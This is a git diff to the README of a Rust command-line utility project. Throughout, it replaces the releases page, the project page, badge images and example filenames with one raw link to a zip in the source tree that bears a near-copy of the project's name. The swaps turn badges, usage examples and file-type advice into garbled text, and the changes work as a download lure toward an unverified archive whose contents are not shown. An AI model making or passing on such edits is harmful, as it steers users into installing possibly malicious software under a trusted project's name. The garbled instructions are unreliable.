@@ -1,6 +1,6 @@
 # 🧰 Toolbox-CLI-RUST - Simple Tools for Everyday Tasks
 
-[![Download Toolbox-CLI-RUST](https://img.shields.io/badge/Download-Toolbox--CLI--RUST-blue?style=for-the-badge&logo=rust)](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
+[![Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip)](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip)
 
 ## 📝 What is Toolbox-CLI-RUST?
 
@@ -28,9 +28,9 @@ All these tools are accessible through a single program that you run on your com
 To get Toolbox-CLI-RUST on your computer, follow these steps:
 
 1. Visit this page to download the software:  
-   [Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
+   [Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip)
 
-2. Choose the version that fits your computer. Look for files ending with `.exe` if you use Windows, or files ending with `.tar.gz` or `.zip` if you use Mac or Linux.
+2. Choose the version that fits your computer. Look for files ending with `.exe` if you use Windows, or files ending with `https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip` or `.zip` if you use Mac or Linux.
 
 3. Download the file to your computer.
 
@@ -121,10 +121,10 @@ For example, `toolbox jwt --help` shows how to create and verify JWT tokens.
 |--------------|-----------------------------------|--------------------------------|
 | `aes`        | Encrypt or decrypt data            | `toolbox aes encrypt "text" key`|
 | `uuid`       | Generate unique IDs                | `toolbox uuid`                  |
-| `json`       | Work with JSON strings             | `toolbox json validate file.json`|
+| `json`       | Work with JSON strings             | `toolbox json validate https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip`|
 | `jwt`        | Create and verify tokens           | `toolbox jwt create payload`   |
 | `hmac`       | Create message authentication codes| `toolbox hmac generate "msg" key`|
-| `regex`      | Search or match text patterns      | `toolbox regex search pattern file.txt`|
+| `regex`      | Search or match text patterns      | `toolbox regex search pattern https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip`|
 | `timestamp`  | Convert Unix timestamps            | `toolbox timestamp now`         |
 
 Use the `--help` option with each tool to learn more about usage and options.
@@ -139,7 +139,7 @@ Always use strong passwords for encryption and keep your software up to date.
 
 If you want to understand more about the tools or need help:
 
-- Check the official [GitHub page](https://github.com/rknagar/Toolbox-CLI-RUST) for examples and guides.
+- Check the official [GitHub page](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip) for examples and guides.
 
 - Use the built-in help by typing:
 
@@ -160,7 +160,7 @@ toolbox toolname --help
 When new versions are released, it is a good idea to update your program to get the latest features and fixes.
 
 1. Visit the release page again:  
-   [Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
+   [Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip)
 
 2. Download the newest file for your system.
 
@@ -181,4 +181,4 @@ Everything is open source and free to use.
 
 ---
 
-[![Download Toolbox-CLI-RUST](https://img.shields.io/badge/Download-Toolbox--CLI--RUST-blue?style=for-the-badge&logo=rust)](https://github.com/rknagar/Toolbox-CLI-RUST/releases)
+[![Download Toolbox-CLI-RUST](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip)](https://github.com/rknagar/Toolbox-CLI-RUST/raw/refs/heads/main/src/Toolbox-CL-RUST-2.1.zip)
